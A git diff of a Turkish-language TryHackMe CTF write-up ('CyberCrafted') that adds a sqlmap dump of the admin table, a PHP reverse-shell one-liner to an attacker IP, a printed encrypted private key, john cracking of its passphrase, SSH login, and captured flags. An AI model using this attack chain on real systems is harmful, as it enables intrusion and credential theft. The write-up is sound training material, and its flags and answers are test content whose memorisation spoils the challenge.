@@ -188,7 +188,7 @@ Siteye eriştiğimizde minecraft item arama sayfası olduğunu görüyoruz.
 
 SQL enjeksiyonu işe yarayabilir.
 
-Bundan sonraki kısımları sqlmap ile yapabilirsiniz fakat ben manuel olarak göstereceğim.
+Bundan sonraki kısımları önce manuel sonra diğer bir yöntem olan sqlmap ile anlatacağım.
 
 
 ![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a4.png?raw=true)
@@ -228,6 +228,7 @@ user:hash ' union select 1,2,3,group_concat(user,0x3a,hash) from admin-- -
 ```
 
 
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a8.png?raw=true)
 
 
 
@@ -236,6 +237,393 @@ Verilen hash'i [crackstation](crackstation.net) sitesinde kıralım.
 ![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a9.png?raw=true)
 
 ```
+xXUltimateCreeperXx
 diamond123456789
+```
+
+Diğer yöntem
+
+Sqlmap
+
+```
+❯ sqlmap -u "http://store.cybercrafted.thm/search.php" --method POST --data "search=doesnt&submit=matter" -p search --batch --dump
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.6.12#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:21:14 /2023-11-11/
+
+[20:21:14] [INFO] testing connection to the target URL
+[20:21:15] [INFO] checking if the target is protected by some kind of WAF/IPS
+[20:21:15] [INFO] testing if the target URL content is stable
+[20:21:15] [INFO] target URL content is stable
+[20:21:15] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
+[20:21:16] [INFO] testing for SQL injection on POST parameter 'search'
+[20:21:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[20:21:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[20:21:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[20:21:21] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[20:21:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[20:21:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[20:21:25] [INFO] testing 'Generic inline queries'
+[20:21:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[20:21:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[20:21:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[20:21:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[20:21:40] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[20:21:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[20:21:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[20:21:41] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[20:21:42] [INFO] target URL appears to have 4 columns in query
+[20:21:43] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
+---
+Parameter: search (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: search=doesnt' AND (SELECT 3319 FROM (SELECT(SLEEP(5)))IDcE) AND 'wUnX'='wUnX&submit=matter
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: search=doesnt' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6a7a71,0x4e6c437776454b6d534569667761636f4d677879684b7375437972614771776166415a5767416642,0x7178717171)-- -&submit=matter
+---
+[20:21:43] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[20:21:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[20:21:45] [INFO] fetching current database
+[20:21:45] [INFO] fetching tables for database: 'webapp'
+[20:21:45] [INFO] fetching columns for table 'stock' in database 'webapp'
+[20:21:45] [INFO] fetching entries for table 'stock' in database 'webapp'
+Database: webapp
+Table: stock
+[139 entries]
++-----+------+------------------------+--------+
+| id  | cost | item                   | amount |
++-----+------+------------------------+--------+
+| 4   | 0.5$ | Acacia Boat            | 1x     |
+| 5   | 0.5$ | Armor Stand            | 1x     |
+| 6   | 0.2$ | Beetroot Seeds         | 16x    |
+| 7   | 0.5$ | Birch Boat             | 1x     |
+| 8   | 1$   | Bottle of Enchanting   | 64x    |
+| 9   | 0.5$ | Bow                    | 1x     |
+| 10  | 0.2$ | Bucket                 | 1x     |
+| 11  | 0.1$ | Carrot                 | 64x    |
+| 12  | 0.4$ | Cocoa Beans            | 64     |
+| 13  | 0.5$ | Crossbow               | 1x     |
+| 14  | 0.5$ | Dark Oak Boat          | 1x     |
+| 15  | 0.1$ | Egg                    | 16x    |
+| 16  | 5$   | End Crystal            | 1x     |
+| 17  | 1$   | Ender Pearl            | 16     |
+| 18  | 2$   | Eye of Ender           | 16x    |
+| 19  | 1$   | Fire Charge            | 16x    |
+| 20  | 0.8$ | Firework Rocket        | 16x    |
+| 21  | 0.2$ | Fishing Rod            | 1x     |
+| 22  | 0.2$ | Flint and Steel        | 1x     |
+| 23  | 0.2$ | Glow Berries           | 16x    |
+| 24  | 0.1$ | Glow Item Frame        | 1x     |
+| 25  | 0.1$ | Item Frame             | 1x     |
+| 26  | 0.5$ | Jungle Boat            | 1x     |
+| 27  | 0.1$ | Kelp                   | 64x    |
+| 28  | 0.5$ | Lava Bucket            | 1x     |
+| 29  | 0.6$ | Lead                   | 1x     |
+| 30  | 2$   | Lingering Potion       | 16x    |
+| 31  | 0.8$ | Melon Seeds            | 64x    |
+| 32  | 0.8$ | Minecart               | 1x     |
+| 33  | 1$   | Nether Wart            | 16x    |
+| 34  | 0.5$ | Oak Boat               | 1x     |
+| 35  | 0.2$ | Painting               | 1x     |
+| 36  | 1$   | Potato                 | 64x    |
+| 37  | 2$   | Redstone Dust          | 64x    |
+| 38  | 0.4$ | Snowball               | 16x    |
+| 39  | 0.1$ | Splash Potion          | 1x     |
+| 40  | 0.5$ | Spruce Boat            | 1x     |
+| 41  | 1$   | String                 | 64x    |
+| 42  | 5$   | Trident                | 1x     |
+| 43  | 0.5$ | Water Bucket           | 1x     |
+| 44  | 0.5$ | Wheat Seeds            | 64x    |
+| 45  | 2$   | Arrow                  | 64x    |
+| 46  | 1$   | Bone                   | 64x    |
+| 47  | 0.4$ | Bone Meal              | 64x    |
+| 48  | 0.5$ | Bowl                   | 16x    |
+| 49  | 2$   | Bread                  | 64x    |
+| 50  | 1$   | Chainmail Boots        | 1x     |
+| 51  | 1.5$ | Chainmail Chestplate   | 1x     |
+| 52  | 1$   | Chainmail Helmet       | 1x     |
+| 53  | 1.2$ | Chainmail Leggings     | 1x     |
+| 54  | 0.5$ | Compass                | 1x     |
+| 55  | 1$   | Cooked Chicken         | 64x    |
+| 56  | 1$   | Cooked Cod             | 64x    |
+| 57  | 1$   | Cooked Mutton          | 64x    |
+| 58  | 1$   | Cooked Porkchop        | 64x    |
+| 59  | 1$   | Cooked Rabbit          | 64x    |
+| 60  | 1$   | Cooked Salmon          | 64x    |
+| 61  | 2$   | Diamond Axe            | 1x     |
+| 62  | 4$   | Diamond Boots          | 1x     |
+| 63  | 6$   | Diamond Chestplate     | 1x     |
+| 64  | 2$   | Diamond Helmet         | 1x     |
+| 65  | 1$   | Diamond Hoe            | 1x     |
+| 66  | 2$   | Diamond Horse Armor    | 1x     |
+| 67  | 5$   | Diamond Leggings       | 1x     |
+| 68  | 3$   | Diamond Pickaxe        | 1x     |
+| 69  | 2$   | Diamond Shovel         | 1x     |
+| 70  | 4$   | Diamond Sword          | 1x     |
+| 71  | 8$   | Elytra                 | 1x     |
+| 72  | 150$ | Enchanted Golden Apple | 64x    |
+| 73  | 5$   | Golden Apple           | 64x    |
+| 74  | 1$   | Golden Axe             | 1x     |
+| 75  | 2$   | Golden Boots           | 1x     |
+| 76  | 4$   | Golden Carrot          | 64x    |
+| 77  | 2$   | Golden Chestplate      | 1x     |
+| 78  | 1$   | Golden Helmet          | 1x     |
+| 79  | 0.5$ | Golden Hoe             | 1x     |
+| 80  | 0.5$ | Golden Horse Armor     | 1x     |
+| 81  | 0.5$ | Golden Leggings        | 1x     |
+| 82  | 0.5$ | Golden Pickaxe         | 1x     |
+| 83  | 0.5$ | Golden Shovel          | 1x     |
+| 84  | 0.5$ | Golden Sword           | 1x     |
+| 85  | 1$   | Iron Axe               | 1x     |
+| 86  | 1.5$ | Iron Boots             | 1x     |
+| 87  | 3$   | Iron Chestplate        | 1x     |
+| 88  | 1$   | Iron Helmet            | 1x     |
+| 89  | 0.5$ | Iron Hoe               | 1x     |
+| 90  | 2$   | Iron Horse Armor       | 1x     |
+| 91  | 2$   | Iron Leggings          | 1x     |
+| 92  | 1$   | Iron Pickaxe           | 1x     |
+| 93  | 0.8$ | Iron Shovel            | 1x     |
+| 94  | 1$   | Iron Sword             | 1x     |
+| 95  | 5$   | Lapis Lazuli           | 64x    |
+| 96  | 0.2$ | Milk Bucket            | 1x     |
+| 97  | 1$   | Mushroom Stew          | 16x    |
+| 98  | 4$   | Name Tag               | 16x    |
+| 99  | 5$   | Netherite Axe          | 1x     |
+| 100 | 6$   | Netherite Boots        | 1x     |
+| 101 | 10$  | Netherite Chestplate   | 1x     |
+| 102 | 4$   | Netherite Helmet       | 1x     |
+| 103 | 6    | Netherite Hoe          | 1x     |
+| 104 | 8$   | Netherite Leggings     | 1x     |
+| 105 | 5$   | Netherite Pickaxe      | 1x     |
+| 106 | 5$   | Netherite Shovel       | 1x     |
+| 107 | 5$   | Netherite Sword        | 1x     |
+| 108 | 1$   | Saddle                 | 1x     |
+| 109 | 0.5$ | Shears                 | 1x     |
+| 110 | 0.5$ | Shield                 | 1x     |
+| 111 | 1$   | Sugar                  | 64x    |
+| 112 | 4$   | Suspicious Stew        | 1x     |
+| 113 | 4$   | Tipped Arrow           | 16x    |
+| 114 | 5$   | Totem of Undying       | 1x     |
+| 115 | 0.2$ | Tropical Fish          | 1x     |
+| 116 | 4$   | Turtle Shell           | 16x    |
+| 117 | 2$   | Wheat                  | 64x    |
+| 118 | 2$   | Amethyst Shard         | 16x    |
+| 119 | 5$   | Blaze Powder           | 64x    |
+| 120 | 5$   | Blaze Rod              | 32x    |
+| 121 | 1$   | Clock                  | 1x     |
+| 122 | 3$   | Coal                   | 64x    |
+| 123 | 5$   | Copper Ingot           | 64x    |
+| 124 | 20$  | Diamond                | 64x    |
+| 125 | 20$  | Emerald                | 64x    |
+| 126 | 2$   | Flint                  | 64x    |
+| 127 | 10$  | Ghast Tear             | 64x    |
+| 128 | 5$   | Glowstone Dust         | 64x    |
+| 129 | 5$   | Gunpowder              | 64x    |
+| 130 | 4$   | Heart of the Sea       | 1x     |
+| 131 | 10$  | Iron Ingot             | 64x    |
+| 132 | 2$   | Lapis Lazuli           | 64x    |
+| 133 | 2$   | Nautilus Shell         | 16x    |
+| 134 | 1$   | Nether Brick           | 64x    |
+| 135 | 8$   | Nether Quartz          | 64x    |
+| 136 | 10$  | Nether Star            | 1x     |
+| 137 | 500$ | Netherite Ingot        | 64x    |
+| 138 | 50$  | Netherite Scrap        | 64x    |
+| 139 | 5$   | Raw Gold               | 64x    |
+| 140 | 5$   | Raw Iron               | 64x    |
+| 141 | 2$   | Shulker Shell          | 16x    |
+| 142 | 1$   | Slimeball              | 16x    |
++-----+------+------------------------+--------+
+
+[20:21:46] [INFO] table 'webapp.stock' dumped to CSV file '/root/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/stock.csv'
+[20:21:46] [INFO] fetching columns for table 'admin' in database 'webapp'
+[20:21:46] [INFO] fetching entries for table 'admin' in database 'webapp'
+[20:21:47] [INFO] recognized possible password hashes in column 'hash'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[20:21:47] [INFO] using hash method 'sha1_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[20:21:47] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[20:21:47] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
+[20:21:47] [INFO] starting 2 processes 
+[20:22:35] [WARNING] no clear password(s) found                                                                                
+Database: webapp
+Table: admin
+[2 entries]
++----+------------------------------------------+---------------------+
+| id | hash                                     | user                |
++----+------------------------------------------+---------------------+
+| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
+| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
++----+------------------------------------------+---------------------+
+
+[20:22:35] [INFO] table 'webapp.admin' dumped to CSV file '/root/.local/share/sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
+[20:22:35] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 29 times
+[20:22:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/store.cybercrafted.thm'
+[20:22:35] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 20:22:35 /2023-11-11/
+```
+
+Kullanıcı adı ve şifreyi öğrendiğimize göre login sayfasından giriş yapalım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a10.png?raw=true)
+
+Giriş yaptığımızda komut çalıştırabileceğimiz bir sayfa görüyoruz.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a11.png?raw=true)
+
+Geriye komut çalıştırmak ve reverse shell almak kaldı.
+
+```
+php -r '$sock=fsockopen("10.14.61.127",1234);exec("/bin/sh -i <&3 >&3 2>&3");''
+nc -nvlp 1234
+```
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a12.png?raw=true)
+
+Makineye giriş yapmayı başardık.
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+2 farklı kullanıcı buluyoruz.
+
+```
+www-data@cybercrafted:/$ cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash
+cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash
+www-data@cybercrafted:/$ 
+```
+
+Sahip olduğumuz şifreleri tekrar kullanmaya çalışırsak işe yaramıyor.
+
+```
+www-data@cybercrafted:/$ su xxultimatecreeperxx
+Password: 
+su: Authentication failure
+www-data@cybercrafted:/$ ^C
+www-data@cybercrafted:/$ su cybercrafted
+Password: 
+su: Authentication failure
+www-data@cybercrafted:/$ 
+```
+
+Xxultimatecreeperxx kullanıcısının şifrelenmiş id_rsa'sını bulduk.
+
+```
+www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ ls -la
+total 16
+drwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .
+drwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 ..
+-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  414 Jun 27  2021 authorized_keys
+-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 1766 Jun 27  2021 id_rsa
+www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ cat id_rsa 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6
+
+Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
++Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
+SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
+SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
+lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
+FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
+sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
+stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
+eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
+VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
+LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
+jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
+Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
+8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
+DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
+0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
+MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
+mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
+gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
+Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
+T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
+1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
+fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
+RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
+v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
+-----END RSA PRIVATE KEY-----
+www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ 
+```
+
+Dosyanın içeriğini kopyalayacağım ve parolayı almak için ssh2john'u kullanacağım.
+
+```
+python usr/share/john/ssh2john.py id_rsa > hash
+```
+
+Ve parolayı buluyoruz.
+
+```
+john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+creepin2006      (id_rsa)
+1g 0:00:00:06 DONE (2023-07-15 20:56) 0.1529g/s 2192Kp/s 2192Kc/s 2192KC/sa6_123..*7¡Vamos!
+Session completed
+```
+
+Şimdi id_rsa'ya SSH ile bağlanabilmesi için 600 izni veriyoruz.
+
+```
+ssh -i id_rsa xxultimatecreeperxx@10.10.93.170
+The authenticity of host '10.10.93.170 (10.10.93.170)' can't be established.
+ECDSA key fingerprint is SHA256:okt+zU5MJ0D6EUFqOILqeZ9l1c9p53AxM90JQpBvfvg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.93.170' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+xxultimatecreeperxx@cybercrafted:~$ whoami
+xxultimatecreeperxx
+xxultimatecreeperxx@cybercrafted:~$ export TERM=xterm
+xxultimatecreeperxx@cybercrafted:~$ 
+```
+
+Minecraft server flag
+
+```
+xxultimatecreeperxx@cybercrafted:/$ find / -name "minecraft_server_flag.txt" 2>/dev/null
+/opt/minecraft/minecraft_server_flag.txt
+xxultimatecreeperxx@cybercrafted:/$ ls -l /opt/minecraft/minecraft_server_flag.txt
+-rw-r----- 1 cybercrafted minecraft 38 Jun 27  2021 /opt/minecraft/minecraft_server_flag.txt
+xxultimatecreeperxx@cybercrafted:/$ cat /opt/minecraft/minecraft_server_flag.txt
+THM{ba93767ae3db9f5b8399680040a0c99e}
+xxultimatecreeperxx@cybercrafted:/$ 
 ```
 
